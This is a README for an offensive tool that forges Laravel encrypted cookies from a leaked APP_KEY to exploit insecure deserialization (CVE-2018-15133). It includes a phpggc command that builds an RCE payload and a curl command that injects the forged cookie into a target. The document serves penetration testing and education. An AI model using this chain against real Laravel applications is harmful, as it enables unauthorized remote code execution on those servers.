# 🔐 Laravel Cookie Generator – Exploiting APP_KEY-based Deserialization

This tool helps you generate **valid Laravel encrypted cookies** using a known `APP_KEY` and a custom PHP serialized payload (e.g., from `phpggc`).  
It is mainly used in the context of **insecure deserialization vulnerabilities** like [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133).

---

## 📌 Purpose

When an attacker can obtain the `APP_KEY` of a Laravel application (via `.env` file, misconfigured endpoint, LFI...), they can:

- Forge a signed and encrypted cookie  
- Inject malicious PHP objects for remote code execution  
- Bypass cookie integrity checks (HMAC)

---

## 🛠️ Features

- AES-256-CBC encryption compatible with Laravel  
- SHA256 HMAC generation  
- Outputs base64-ready string for direct injection  
- Works with any phpggc-generated payload

---

## 🧪 Usage Example

### 1. Generate a payload with [phpggc](https://github.com/ambionics/phpggc)

```bash
php phpggc Laravel/RCE1 system 'uname -a' > payload.txt
```

### 2. Install dependencies

```bash
pip install pycryptodome
```

### 3. Run the generator

```bash
python3 gen_laravel_cookie.py
```

This will output a cookie like:

```css
[+] Laravel Cookie to inject:
eyJpdiI6IkxWbWdn... (base64 string)
```

### 4. Inject the cookie (with curl or Burp)

```bash
curl -k --cookie "XSRF-TOKEN=eyJpdiI6..." http://target-ip:port/
```

---

## 🖼️ Example Screenshot

Replace the image below with a relevant screenshot (e.g., phpggc + output + curl):

![demo](images/demo.png)

---

## 🔑 Requirements

- Python 3.6+
- pycryptodome
- A valid Laravel APP_KEY (base64 format)

---

## ⚠️ Disclaimer

This tool is provided for educational and authorized penetration testing purposes only.  
Do not use it against systems you do not have explicit permission to assess.

---

## 📂 File Structure

```bash
laravel-cookie-generator/
├── gen_laravel_cookie.py     # The main script
├── payload.txt               # Serialized payload (input)
├── README.md                 # This file
└── images/
    └── demo.png              # Optional screenshot
```

---

## ✉️ Author

Tool developed by a security researcher passionate about web exploitation, deserialization, and Active Directory attacks.  
Feel free to contribute, fork, or open an issue!
